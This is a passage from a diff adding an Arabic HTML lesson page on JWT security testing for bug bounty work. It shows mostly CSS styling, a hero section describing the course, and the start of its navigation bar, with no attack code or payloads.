@@ -1,0 +1,3113 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hamada Khairy — منهجية اختبار JWT</title>
+    <link
+        href="https://fonts.googleapis.com/css2?family=Cormorant+Garamond:ital,wght@0,300;0,400;0,600;0,700;1,300;1,400;1,600;1,700&family=Cinzel:wght@400;600;700&family=EB+Garamond:ital,wght@0,400;0,500;1,400;1,500&family=JetBrains+Mono:wght@400;700&family=Cairo:wght@300;400;600;700;900&family=Tajawal:wght@300;400;700;900&display=swap"
+        rel="stylesheet">
+    <style>
+        :root {
+            --bg: #0b0507;
+            --bg2: #120609;
+            --bg3: #190b0e;
+            --bg4: #210e12;
+            --border: rgba(220, 38, 38, 0.15);
+            --border2: rgba(220, 38, 38, 0.07);
+            --red: #dc2626;
+            --red2: #f87171;
+            --rdim: #7f1d1d;
+            --rose: #fb7185;
+            --cream: #f8eded;
+            --text: #c4a8a8;
+            --muted: #7a4848;
+            --muted2: #3d2020;
+            --gold: #c9a063;
+            --gold2: #e2bc7a;
+            --gdim: #8a6a3a;
+            --teal: #5a9a8a;
+            --green: #5a8a6a;
+            --white: #fff5f5;
+            --blue: #7a90c8;
+        }
+
+        *,
+        *::before,
+        *::after {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0
+        }
+
+        html {
+            scroll-behavior: smooth
+        }
+
+        body {
+            background: var(--bg);
+            color: var(--text);
+            font-family: 'Tajawal', 'Cairo', sans-serif;
+            font-size: 15px;
+            line-height: 1.85;
+            direction: rtl;
+            overflow-x: hidden
+        }
+
+        body::before {
+            content: '';
+            position: fixed;
+            inset: 0;
+            background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 512 512' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.75' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)' opacity='0.04'/%3E%3C/svg%3E");
+            pointer-events: none;
+            z-index: 9998;
+            opacity: .5
+        }
+
+        .hero {
+            min-height: 100vh;
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            align-items: center;
+            position: relative;
+            overflow: hidden;
+            padding: 0 5vw;
+            gap: 2rem
+        }
+
+        .hero::after {
+            content: '';
+            position: absolute;
+            inset: 0;
+            background: radial-gradient(ellipse 70% 60% at 65% 50%, rgba(220, 38, 38, .07) 0%, transparent 60%);
+            pointer-events: none
+        }
+
+        .hero-left {
+            position: relative;
+            z-index: 2;
+            padding: 5rem 0
+        }
+
+        .eyebrow {
+            display: flex;
+            align-items: center;
+            gap: .8rem;
+            margin-bottom: 2rem;
+            font-family: 'Cinzel', serif;
+            font-size: .6rem;
+            letter-spacing: .25em;
+            color: var(--rdim);
+            direction: ltr
+        }
+
+        .eyebrow::before {
+            content: '';
+            display: block;
+            width: 28px;
+            height: 1px;
+            background: var(--rdim)
+        }
+
+        .eyebrow span {
+            color: var(--red)
+        }
+
+        .hero-title {
+            font-family: 'Cormorant Garamond', serif;
+            font-weight: 300;
+            font-size: clamp(3.2rem, 5.5vw, 5.2rem);
+            line-height: 1.05;
+            color: var(--white)
+        }
+
+        .hero-italic {
+            font-family: 'Cormorant Garamond', serif;
+            font-weight: 300;
+            font-style: italic;
+            font-size: clamp(3.2rem, 5.5vw, 5.2rem);
+            color: var(--red);
+            display: block;
+            line-height: 1.05;
+            margin-top: .1rem
+        }
+
+        .hero-desc {
+            font-family: 'EB Garamond', serif;
+            font-style: italic;
+            font-size: 1.05rem;
+            color: var(--muted);
+            max-width: 480px;
+            margin: 1.8rem 0 2.5rem;
+            line-height: 1.75
+        }
+
+        .hero-btns {
+            display: flex;
+            gap: 1rem;
+            flex-wrap: wrap
+        }
+
+        .btn-red {
+            background: var(--red);
+            color: #fff;
+            font-family: 'Cinzel', serif;
+            font-size: .68rem;
+            letter-spacing: .2em;
+            padding: .85rem 2rem;
+            border: none;
+            cursor: pointer;
+            text-decoration: none;
+            display: inline-block;
+            transition: background .2s
+        }
+
+        .btn-red:hover {
+            background: var(--red2)
+        }
+
+        .btn-outline {
+            background: transparent;
+            color: var(--cream);
+            font-family: 'Cinzel', serif;
+            font-size: .68rem;
+            letter-spacing: .2em;
+            padding: .85rem 2rem;
+            border: 1px solid rgba(220, 38, 38, .3);
+            cursor: pointer;
+            text-decoration: none;
+            display: inline-block;
+            transition: all .2s
+        }
+
+        .btn-outline:hover {
+            border-color: var(--red);
+            color: var(--red)
+        }
+
+        .hero-tag {
+            margin-top: 3rem;
+            display: flex;
+            align-items: center;
+            gap: .8rem;
+            font-family: 'Cinzel', serif;
+            font-size: .58rem;
+            letter-spacing: .2em;
+            color: var(--muted2);
+            direction: ltr
+        }
+
+        .hero-tag::before {
+            content: '';
+            display: block;
+            width: 28px;
+            height: 1px;
+            background: var(--muted2)
+        }
+
+        .char-wrap {
+            position: relative;
+            width: 400px;
+            height: 400px;
+            display: flex;
+            align-items: center;
+            justify-content: center
+        }
+
+        .char-wrap::before {
+            content: '';
+            position: absolute;
+            inset: 0;
+            border-radius: 50%;
+            border: 1px solid rgba(220, 38, 38, .15);
+            box-shadow: 0 0 80px rgba(220, 38, 38, .07), inset 0 0 80px rgba(220, 38, 38, .04)
+        }
+
+        .char-wrap::after {
+            content: '';
+            position: absolute;
+            inset: 18px;
+            border-radius: 50%;
+            border: 1px solid rgba(220, 38, 38, .07)
+        }
+
+        .char-img {
+            width: 350px;
+            height: 350px;
+            object-fit: contain;
+            object-position: top center;
+            position: relative;
+            z-index: 2;
+            filter: drop-shadow(0 20px 60px rgba(0, 0, 0, .85))
+        }
+
+        .char-label {
+            position: absolute;
+            bottom: 18px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: rgba(11, 5, 7, .9);
+            border: 1px solid rgba(220, 38, 38, .25);
+            padding: .38rem 1.2rem;
+            font-family: 'Cinzel', serif;
+            font-size: .58rem;
+            letter-spacing: .2em;
+            color: var(--red);
+            white-space: nowrap;
+            direction: ltr
+        }
+
+        .char-label::before,
+        .char-label::after {
+            content: '◆';
+            margin: 0 .5rem;
+            font-size: .38rem;
+            opacity: .5
+        }
+
+        .hero-right {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+            z-index: 2
+        }
+
+        .top-nav {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            z-index: 1000;
+            background: rgba(11, 5, 7, .95);
+            backdrop-filter: blur(16px);
+            border-bottom: 1px solid var(--border);
+            padding: 0 5vw;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            height: 54px
+        }
+
+        .nav-brand {
+            font-family: 'Cormorant Garamond', serif;
+            font-size: .98rem;
+            color: var(--cream)
+        }
+
+        .nav-brand em {
+            color: var(--red);
+            font-style: italic
+        }
+
+        .nav-links {
+            display: flex;
+            gap: 0;
+            overflow-x: auto;
+            scrollbar-width: none
+        }
+
+        .nav-links::-webkit-scrollbar {
+            display: none
+        }
+
+        .nav-link {
+            padding: 0 .9rem;
+            height: 54px;
+            display: flex;
+            align-items: center;
+            font-family: 'Cinzel', serif;
+            font-size: .54rem;
+            letter-spacing: .11em;
+            color: var(--muted);
+            text-decoration: none;
+            border-bottom: 2px solid transparent;
+            transition: all .2s;
+            white-space: nowrap
+        }
+
+        .nav-link:hover {
+            color: var(--red)
+        }
+
+        .nav-link.active {
+            color: var(--red);
+            border-bottom-color: var(--red)
+        }
+
+        .container {
+            max-width: 1140px;
+            margin: 0 auto;
+            padding: 0 5vw
+        }
+
+        .section {
+            padding: 6rem 0;
+            border-bottom: 1px solid var(--border2)
+        }
+
+        .sec-eye {
+            display: flex;
+            align-items: center;
+            gap: .8rem;
+            margin-bottom: 1.2rem;
+            font-family: 'Cinzel', serif;
+            font-size: .58rem;
+            letter-spacing: .25em;
+            color: var(--rdim);
+            direction: ltr
+        }
+
+        .sec-eye::before {
+            content: '';
+            display: block;
+            width: 22px;
+            height: 1px;
+            background: var(--rdim)
+        }
+
+        .sec-title {
+            font-family: 'Cormorant Garamond', serif;
+            font-weight: 300;
+            font-size: clamp(2rem, 3.8vw, 3.2rem);
+            line-height: 1.1;
+            color: var(--white)
+        }
+
+        .sec-title em {
+            font-style: italic;
+            color: var(--red)
+        }
+
+        .sec-desc {
+            font-family: 'EB Garamond', serif;
+            font-style: italic;
+            color: var(--muted);
+            font-size: 1.02rem;
+            max-width: 580px;
+            margin-top: .8rem;
+            line-height: 1.75
+        }
+
+        .ornament {
+            text-align: center;
+            color: var(--rdim);
+            font-size: .65rem;
+            letter-spacing: .5em;
+            margin: 2.5rem 0;
+            opacity: .45
+        }
+
+        .card {
+            background: var(--bg2);
+            border: 1px solid var(--border);
+            padding: 2rem;
+            position: relative;
+            transition: border-color .3s
+        }
+
+        .card:hover {
+            border-color: rgba(220, 38, 38, .28)
+        }
+
+        .cr {
+            border-right: 2px solid var(--red)
+        }
+
+        .cg {
+            border-right: 2px solid var(--gold)
+        }
+
+        .ct {
+            border-right: 2px solid var(--teal)
+        }
+
+        .cgr {
+            border-right: 2px solid var(--green)
+        }
+
+        .cd {
+            border-right: 2px solid var(--muted2)
+        }
+
+        .clabel {
+            font-family: 'Cinzel', serif;
+            font-size: .56rem;
+            letter-spacing: .18em;
+            color: var(--rdim);
+            margin-bottom: .8rem;
+            direction: ltr
+        }
+
+        .clabel.g {
+            color: var(--gdim)
+        }
+
+        .clabel.t {
+            color: var(--teal)
+        }
+
+        .clabel.gr {
+            color: var(--green)
+        }
+
+        .card h3 {
+            font-family: 'Cormorant Garamond', serif;
+            font-size: 1.2rem;
+            font-weight: 600;
+            color: var(--cream);
+            margin-bottom: .7rem
+        }
+
+        .card p,
+        .card li {
+            color: var(--text);
+            font-size: .9rem;
+            line-height: 1.85
+        }
+
+        .card ul {
+            padding-right: 1rem
+        }
+
+        .card ul li {
+            margin-bottom: .35rem
+        }
+
+        .g2 {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 1.5rem
+        }
+
+        .g3 {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 1.5rem
+        }
+
+        @media(max-width:800px) {
+
+            .g2,
+            .g3 {
+                grid-template-columns: 1fr
+            }
+
+            .hero {
+                grid-template-columns: 1fr
+            }
+
+            .char-wrap {
+                display: none
+            }
+        }
+
+        .cl {
+            list-style: none;
+            padding: 0
+        }
+
+        .cl li {
+            display: flex;
+            align-items: flex-start;
+            gap: .8rem;
+            padding: .55rem 0;
+            border-bottom: 1px solid var(--border2);
+            color: var(--text);
+            font-size: .89rem;
+            line-height: 1.75
+        }
+
+        .cl li:last-child {
+            border-bottom: none
+        }
+
+        .cl li::before {
+            content: '◆';
+            color: var(--rdim);
+            font-size: .42rem;
+            margin-top: .58rem;
+            flex-shrink: 0
+        }
+
+        .tg {
+            background: rgba(220, 38, 38, .07);
+            border: 1px solid rgba(220, 38, 38, .2);
+            color: var(--rdim);
+            font-family: 'Cinzel', serif;
+            font-size: .53rem;
+            padding: .13rem .5rem;
+            letter-spacing: .08em;
+            flex-shrink: 0
+        }
+
+        .tg.t {
+            background: rgba(90, 154, 138, .1);
+            border-color: rgba(90, 154, 138, .2);
+            color: var(--teal)
+        }
+
+        .tg.g {
+            background: rgba(220, 38, 38, .08);
+            border-color: rgba(220, 38, 38, .2);
+            color: var(--gdim)
+        }
+
+        .cb {
+            background: #060203;
+            border: 1px solid var(--border);
+            padding: 1.6rem;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: .72rem;
+            line-height: 2;
+            overflow-x: auto;
+            direction: ltr;
+            text-align: left
+        }
+
+        .cb-lbl {
+            font-family: 'Cinzel', serif;
+            font-size: .52rem;
+            letter-spacing: .16em;
+            color: var(--rdim);
+            margin-bottom: 1rem;
+            opacity: .65;
+            display: block
+        }
+
+        .cb .r {
+            color: var(--red)
+        }
+
+        .cb .r2 {
+            color: var(--rose)
+        }
+
+        .cb .g {
+            color: var(--gold)
+        }
+
+        .cb .g2 {
+            color: var(--gold2)
+        }
+
+        .cb .t {
+            color: #7ac8b8
+        }
+
+        .cb .w {
+            color: var(--cream)
+        }
+
+        .cb .y {
+            color: #c8b870
+        }
+
+        .cb .m {
+            color: var(--muted)
+        }
+
+        .cb .gr {
+            color: #7ac888
+        }
+
+        .cb .d {
+            color: var(--muted2)
+        }
+
+        .cb .bl {
+            color: var(--blue)
+        }
+
+        .jwt-visual {
+            background: #060203;
+            border: 1px solid var(--border);
+            padding: 1.8rem;
+            overflow-x: auto;
+            margin: 1.5rem 0
+        }
+
+        .jwt-tok {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: .62rem;
+            direction: ltr;
+            text-align: left;
+            word-break: break-all;
+            line-height: 1.7;
+            margin-bottom: 1.2rem
+        }
+
+        .jt-h {
+            color: var(--red)
+        }
+
+        .jt-d {
+            color: var(--muted)
+        }
+
+        .jt-p {
+            color: var(--gold)
+        }
+
+        .jt-s {
+            color: var(--teal)
+        }
+
+        .jwt-decoded {
+            display: grid;
+            grid-template-columns: 1fr 1fr 1fr;
+            gap: 1rem;
+            margin-top: 1rem
+        }
+
+        .jdp {
+            padding: 1rem
+        }
+
+        .jdp-h {
+            background: rgba(220, 38, 38, .07);
+            border: 1px solid rgba(220, 38, 38, .22)
+        }
+
+        .jdp-p {
+            background: rgba(220, 38, 38, .07);
+            border: 1px solid rgba(220, 38, 38, .22)
+        }
+
+        .jdp-s {
+            background: rgba(90, 154, 138, .07);
+            border: 1px solid rgba(90, 154, 138, .22)
+        }
+
+        .jdp-label {
+            font-family: 'Cinzel', serif;
+            font-size: .5rem;
+            letter-spacing: .15em;
+            margin-bottom: .6rem
+        }
+
+        .jdp-h .jdp-label {
+            color: var(--red)
+        }
+
+        .jdp-p .jdp-label {
+            color: var(--gold)
+        }
+
+        .jdp-s .jdp-label {
+            color: var(--teal)
+        }
+
+        .jdp-code {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: .63rem;
+            color: var(--text);
+            direction: ltr;
+            text-align: left;
+            line-height: 1.7;
+            white-space: pre-wrap
+        }
+
+        @media(max-width:800px) {
+            .jwt-decoded {
+                grid-template-columns: 1fr
+            }
+        }
+
+        .formula-box {
+            background: #060203;
+            border: 1px solid var(--border);
+            padding: 1.6rem 2rem;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: .73rem;
+            line-height: 2.2;
+            direction: ltr;
+            text-align: left;
+            overflow-x: auto;
+            margin: 1.2rem 0
+        }
+
+        .fn {
+            color: var(--teal)
+        }
+
+        .arg {
+            color: var(--gold)
+        }
+
+        .op {
+            color: var(--muted)
+        }
+
+        .out {
+            color: var(--rose)
+        }
+
+        .key {
+            color: var(--red)
+        }
+
+        .concat {
+            color: var(--cream)
+        }
+
+        .sb {
+            border: 1px solid var(--border);
+            overflow: hidden;
+            background: var(--bg2)
+        }
+
+        .sb-hd {
+            background: rgba(220, 38, 38, .04);
+            border-bottom: 1px solid var(--border);
+            padding: .75rem 1.8rem;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            direction: ltr
+        }
+
+        .sb-type {
+            font-family: 'Cinzel', serif;
+            font-size: .55rem;
+            letter-spacing: .15em;
+            color: var(--rdim)
+        }
+
+        .sb-time {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: .6rem;
+            color: var(--muted)
+        }
+
+        .sb-body {
+            padding: 1.8rem 2rem
+        }
+
+        .sb-body p {
+            color: var(--text);
+            font-size: .94rem;
+            line-height: 1.9;
+            margin-bottom: 1rem
+        }
+
+        .sb-body p:last-child {
+            margin-bottom: 0
+        }
+
+        .hl {
+            color: var(--red);
+            font-weight: 700
+        }
+
+        .hl2 {
+            color: #7ac8b8;
+            font-weight: 700
+        }
+
+        .hl3 {
+            color: var(--gold);
+            font-weight: 700
+        }
+
+        .nb {
+            background: rgba(220, 38, 38, .04);
+            border-right: 2px solid var(--rdim);
+            padding: .9rem 1.1rem;
+            color: var(--text);
+            font-size: .88rem;
+            margin: 1.1rem 0;
+            font-family: 'EB Garamond', serif;
+            font-style: italic
+        }
+
+        .wb {
+            background: rgba(220, 38, 38, .05);
+            border-right: 2px solid var(--gdim);
+            padding: .9rem 1.1rem;
+            color: var(--text);
+            font-size: .88rem;
+            margin: 1.1rem 0;
+            font-family: 'EB Garamond', serif;
+            font-style: italic
+        }
+
+        .db {
+            background: rgba(90, 154, 138, .05);
+            border-right: 2px solid var(--teal);
+            padding: .9rem 1.1rem;
+            color: var(--text);
+            font-size: .88rem;
+            margin: 1.1rem 0;
+            font-family: 'EB Garamond', serif;
+            font-style: italic
+        }
+
+        .attack-box {
+            border: 1px solid rgba(220, 38, 38, .3);
+            background: rgba(220, 38, 38, .04);
+            overflow: hidden;
+            margin: 1.5rem 0
+        }
+
+        .attack-hd {
+            background: rgba(220, 38, 38, .08);
+            border-bottom: 1px solid rgba(220, 38, 38, .2);
+            padding: .65rem 1.4rem;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            direction: ltr
+        }
+
+        .attack-name {
+            font-family: 'Cinzel', serif;
+            font-size: .6rem;
+            letter-spacing: .16em;
+            color: var(--red)
+        }
+
+        .attack-sev {
+            font-family: 'Cinzel', serif;
+            font-size: .5rem;
+            letter-spacing: .12em;
+            padding: .18rem .65rem;
+            border: 1px solid rgba(220, 38, 38, .35);
+            color: var(--red)
+        }
+
+        .attack-body {
+            padding: 1.4rem 1.6rem
+        }
+
+        .attack-body p {
+            color: var(--text);
+            font-size: .9rem;
+            line-height: 1.85;
+            margin-bottom: .8rem
+        }
+
+        .attack-body p:last-child {
+            margin-bottom: 0
+        }
+
+        .dt {
+            background: var(--bg2);
+            border: 1px solid var(--border);
+            padding: 1.8rem 2rem 1.4rem;
+            overflow-x: auto
+        }
+
+        .dt-lbl {
+            font-family: 'Cinzel', serif;
+            font-size: .54rem;
+            letter-spacing: .18em;
+            color: var(--rdim);
+            margin-bottom: 1.4rem;
+            direction: ltr
+        }
+
+        .dn {
+            display: inline-block;
+            padding: .3rem .85rem;
+            font-size: .72rem;
+            font-family: 'JetBrains Mono', monospace;
+            white-space: nowrap
+        }
+
+        .dq {
+            background: rgba(106, 144, 200, .12);
+            border: 1px solid rgba(106, 144, 200, .28);
+            color: var(--blue)
+        }
+
+        .dr2 {
+            background: rgba(220, 38, 38, .1);
+            border: 1px solid rgba(220, 38, 38, .28);
+            color: var(--red)
+        }
+
+        .dy {
+            background: rgba(220, 38, 38, .1);
+            border: 1px solid rgba(220, 38, 38, .28);
+            color: var(--gold)
+        }
+
+        .dn-ok {
+            background: rgba(90, 138, 106, .08);
+            border: 1px solid rgba(90, 138, 106, .25);
+            color: var(--green)
+        }
+
+        .da {
+            background: rgba(220, 38, 38, .05);
+            border: 1px solid rgba(220, 38, 38, .13);
+            color: var(--cream)
+        }
+
+        .dw {
+            background: rgba(90, 154, 138, .08);
+            border: 1px solid rgba(90, 154, 138, .22);
+            color: var(--teal)
+        }
+
+        .dt-row {
+            display: flex;
+            align-items: center;
+            gap: .65rem;
+            margin: .45rem 0;
+            direction: ltr;
+            flex-wrap: wrap
+        }
+
+        .darr {
+            color: var(--muted2);
+            font-family: 'JetBrains Mono', monospace;
+            font-size: .72rem
+        }
+
+        .di {
+            margin-left: 2rem;
+            border-left: 1px solid var(--border);
+            padding-left: 1.4rem;
+            margin-top: .4rem
+        }
+
+        .nt {
+            background: #060203;
+            border: 1px solid rgba(220, 38, 38, .18);
+            padding: 1.8rem;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: .7rem;
+            line-height: 2;
+            direction: ltr;
+            text-align: left
+        }
+
+        .nt .h1 {
+            color: var(--red)
+        }
+
+        .nt .h2 {
+            color: var(--rose)
+        }
+
+        .nt .h3 {
+            color: #c8a070
+        }
+
+        .nt .k {
+            color: #7ac8b8
+        }
+
+        .nt .v {
+            color: var(--text)
+        }
+
+        .nt .dm {
+            color: var(--muted)
+        }
+
+        .nt .fl {
+            color: var(--red)
+        }
+
+        .nt .ok {
+            color: var(--green)
+        }
+
+        .nt .warn {
+            color: var(--gold)
+        }
+
+        .step {
+            display: flex;
+            gap: 1.8rem;
+            margin-bottom: 2.2rem;
+            align-items: flex-start
+        }
+
+        .sn {
+            width: 44px;
+            height: 44px;
+            flex-shrink: 0;
+            border: 1px solid rgba(220, 38, 38, .28);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-family: 'Cormorant Garamond', serif;
+            font-size: 1.05rem;
+            color: var(--rdim)
+        }
+
+        .sc h4 {
+            font-family: 'Cormorant Garamond', serif;
+            font-size: 1.18rem;
+            color: var(--cream);
+            margin-bottom: .4rem;
+            font-weight: 600
+        }
+
+        .sc p {
+            color: var(--text);
+            font-size: .9rem;
+            line-height: 1.85
+        }
+
+        .ic {
+            background: rgba(220, 38, 38, .07);
+            color: var(--rdim);
+            font-family: 'JetBrains Mono', monospace;
+            font-size: .72em;
+            padding: .1em .42em;
+            border: 1px solid rgba(220, 38, 38, .13)
+        }
+
+        .dt2 {
+            width: 100%;
+            border-collapse: collapse;
+            font-size: .83rem
+        }
+
+        .dt2 th {
+            background: rgba(220, 38, 38, .05);
+            color: var(--rdim);
+            font-family: 'Cinzel', serif;
+            font-size: .54rem;
+            letter-spacing: .13em;
+            padding: .85rem 1.1rem;
+            text-align: right;
+            border-bottom: 1px solid rgba(220, 38, 38, .18);
+            font-weight: 400
+        }
+
+        .dt2 td {
+            padding: .75rem 1.1rem;
+            border-bottom: 1px solid var(--border2);
+            color: var(--text);
+            vertical-align: top;
+            line-height: 1.7
+        }
+
+        .dt2 tr:hover td {
+            background: rgba(220, 38, 38, .02)
+        }
+
+        .pb {
+            display: inline-block;
+            border: 1px solid rgba(220, 38, 38, .22);
+            color: var(--rdim);
+            font-family: 'Cinzel', serif;
+            font-size: .5rem;
+            padding: .18rem .65rem;
+            letter-spacing: .1em
+        }
+
+        .pb.crit {
+            border-color: rgba(220, 38, 38, .4);
+            color: var(--red);
+            background: rgba(220, 38, 38, .08)
+        }
+
+        .pb.high {
+            border-color: rgba(220, 38, 38, .3);
+            color: var(--gold)
+        }
+
+        .pb.med {
+            border-color: rgba(90, 154, 138, .25);
+            color: var(--teal)
+        }
+
+        .qc {
+            background: var(--bg2);
+            border: 1px solid var(--border);
+            padding: 2rem;
+            margin-bottom: 1.5rem
+        }
+
+        .qq {
+            font-family: 'Cormorant Garamond', serif;
+            font-size: 1.1rem;
+            color: var(--cream);
+            margin-bottom: 1.4rem;
+            line-height: 1.6
+        }
+
+        .qq::before {
+            content: '— ';
+            color: var(--rdim)
+        }
+
+        .qos {
+            display: flex;
+            flex-direction: column;
+            gap: .55rem
+        }
+
+        .qo {
+            display: flex;
+            align-items: flex-start;
+            gap: .9rem;
+            padding: .8rem 1.1rem;
+            border: 1px solid var(--border);
+            cursor: pointer;
+            transition: all .2s;
+            font-size: .88rem;
+            color: var(--text)
+        }
+
+        .qo:hover {
+            border-color: rgba(220, 38, 38, .32);
+            background: rgba(220, 38, 38, .02)
+        }
+
+        .qo.correct {
+            border-color: rgba(220, 38, 38, .45);
+            background: rgba(220, 38, 38, .06);
+            color: var(--rose)
+        }
+
+        .qo.wrong {
+            border-color: rgba(220, 38, 38, .28);
+            background: rgba(220, 38, 38, .04);
+            color: #c0a070
+        }
+
+        .ql {
+            font-family: 'Cormorant Garamond', serif;
+            font-size: .98rem;
+            color: var(--rdim);
+            flex-shrink: 0;
+            line-height: 1.45
+        }
+
+        .qe {
+            margin-top: 1.1rem;
+            padding: 1.1rem;
+            background: rgba(220, 38, 38, .04);
+            border-right: 2px solid var(--rdim);
+            font-family: 'EB Garamond', serif;
+            font-style: italic;
+            font-size: .93rem;
+            color: var(--text);
+            display: none;
+            line-height: 1.75
+        }
+
+        .qe.show {
+            display: block
+        }
+
+        .qe strong {
+            color: var(--red);
+            font-style: normal;
+            font-family: 'Cairo', sans-serif
+        }
+
+        .vf-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 1rem;
+            margin: 1.2rem 0
+        }
+
+        .vf-vuln {
+            border: 1px solid rgba(220, 38, 38, .3);
+            background: rgba(220, 38, 38, .03)
+        }
+
+        .vf-fix {
+            border: 1px solid rgba(90, 138, 106, .3);
+            background: rgba(90, 138, 106, .03)
+        }
+
+        .vf-head {
+            padding: .5rem 1rem;
+            font-family: 'Cinzel', serif;
+            font-size: .52rem;
+            letter-spacing: .12em
+        }
+
+        .vf-vuln .vf-head {
+            color: var(--red);
+            border-bottom: 1px solid rgba(220, 38, 38, .2);
+            background: rgba(220, 38, 38, .06)
+        }
+
+        .vf-fix .vf-head {
+            color: var(--green);
+            border-bottom: 1px solid rgba(90, 138, 106, .2);
+            background: rgba(90, 138, 106, .06)
+        }
+
+        .vf-body {
+            padding: .9rem 1rem;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: .67rem;
+            line-height: 1.8;
+            direction: ltr;
+            text-align: left
+        }
+
+        .vf-body .r {
+            color: var(--red)
+        }
+
+        .vf-body .g {
+            color: var(--green)
+        }
+
+        .vf-body .m {
+            color: var(--muted)
+        }
+
+        .vf-body .w {
+            color: var(--cream)
+        }
+
+        .vf-body .t {
+            color: #7ac8b8
+        }
+
+        @media(max-width:800px) {
+            .vf-grid {
+                grid-template-columns: 1fr
+            }
+        }
+
+        .rev {
+            opacity: 0;
+            transform: translateY(16px);
+            transition: opacity .6s ease, transform .6s ease
+        }
+
+        .rev.in {
+            opacity: 1;
+            transform: none
+        }
+
+        footer {
+            padding: 3.5rem 5vw;
+            border-top: 1px solid var(--border);
+            text-align: center
+        }
+
+        footer p {
+            font-family: 'Cinzel', serif;
+            font-size: .56rem;
+            letter-spacing: .18em;
+            color: var(--muted2)
+        }
+
+        .rline {
+            width: 55px;
+            height: 1px;
+            background: linear-gradient(90deg, transparent, var(--rdim), transparent);
+            margin: 1.2rem auto
+        }
+
+        /* BLACK SITE INJECTIONS */
+        body {
+            cursor: none !important;
+        }
+
+        .cursor-dot {
+            position: fixed;
+            width: 6px;
+            height: 6px;
+            background: var(--red, #dc2626);
+            border-radius: 50%;
+            pointer-events: none;
+            z-index: 9999;
+            transform: translate(-50%, -50%);
+            transition: transform 0.1s;
+            box-shadow: 0 0 10px var(--red, #dc2626);
+        }
+
+        .cursor-ring {
+            position: fixed;
+            width: 32px;
+            height: 32px;
+            border: 1px solid rgba(220, 38, 38, 0.5);
+            border-radius: 50%;
+            pointer-events: none;
+            z-index: 9998;
+            transform: translate(-50%, -50%);
+            transition: transform 0.25s cubic-bezier(.23, 1, .32, 1), width 0.2s, height 0.2s, border-color 0.2s;
+        }
+
+        body:has(a:hover) .cursor-ring,
+        body:has(button:hover) .cursor-ring,
+        body:has(.ws-tab:hover) .cursor-ring,
+        body:has(.lab-card:hover) .cursor-ring {
+            width: 48px;
+            height: 48px;
+            border-color: var(--red, #dc2626);
+        }
+
+        /* SCANLINE SWEEP */
+        .scanline {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 2px;
+            background: linear-gradient(90deg, transparent, rgba(220, 38, 38, 0.15), transparent);
+            animation: scan 8s linear infinite;
+            z-index: 9996;
+            pointer-events: none;
+        }
+
+        @keyframes scan {
+            0% {
+                top: -2px;
+                opacity: 0;
+            }
+
+            5% {
+                opacity: 1;
+            }
+
+            95% {
+                opacity: 0.3;
+            }
+
+            100% {
+                top: 100vh;
+                opacity: 0;
+            }
+        }
+
+        /* HEX GRID BACKGROUND */
+        .hex-bg {
+            position: fixed;
+            inset: 0;
+            z-index: 0;
+            background-image: radial-gradient(ellipse 80% 50% at 50% 0%, rgba(220, 38, 38, 0.04) 0%, transparent 60%);
+            overflow: hidden;
+            pointer-events: none;
+        }
+
+        .hex-bg canvas {
+            position: absolute;
+            inset: 0;
+            opacity: 0.6;
+            pointer-events: none;
+        }
+
+        /* ADJUST MAIN CONTAINER Z-INDEX SO IT SITS ABOVE HEX BG */
+        .main,
+        .container,
+        .topbar,
+        .lab-view,
+        .lv-topbar,
+        .lv-sidebar,
+        .lv-workspace,
+        .lv-body,
+        .lv-title,
+        .hero {
+            position: relative;
+            z-index: 10;
+        }
+    </style>
+</head>
+
+<!-- BLACK SITE INJECTIONS -->
+<div class="cursor-dot" id="cursorDot"></div>
+<div class="cursor-ring" id="cursorRing"></div>
+<div class="scanline"></div>
+<div class="hex-bg"><canvas id="hexCanvas"></canvas></div>
+
+
+<!-- HERO -->
+<section class="hero">
+    <div class="hero-left">
+        <div class="eyebrow">BUG BOUNTY <span>·</span> AUTHENTICATION <span>·</span> JWT ATTACKS</div>
+        <h1 class="hero-title">منهجية اختبار</h1>
+        <span class="hero-italic">الـ JWT.</span>
+        <p class="hero-desc">من فهم التوقيع الكريبتوغرافي لحد استغلال الـ algorithm confusion وسرقة الـ secret —
+            الدليل الكامل لاختراق الـ JSON Web Tokens.</p>
+        <div class="hero-btns">
+            <a class="btn-red" href="#s1">ابدأ الدرس →</a>
+            <a class="btn-outline" href="#s14">الـ Cheatsheet</a>
+        </div>
+        <div class="hero-tag">TAUGHT BY HAMADA KHAIRY · JWT · AUTHN · BUG BOUNTY</div>
+    </div>
+    <div class="hero-right">
+        <div class="char-wrap">
+            <img src="FastFetch-Hamada.png" alt="Hamada Khairy" class="char-img">
+            <div class="char-label">THE INSTRUCTOR</div>
+        </div>
+    </div>
+</section>
+
+<!-- NAV -->
+<nav class="top-nav">
+    <div class="nav-brand">Hamada Khairy <em>Academy</em></div>
+    <div class="nav-links">
+        <a class="nav-link active" href="#s1">JWT ما هو؟</a>
+        <a class="nav-link" href="#s2">التشريح</a>
+        <a class="nav-link" href="#s3">Base64 ≠ Enc</a>
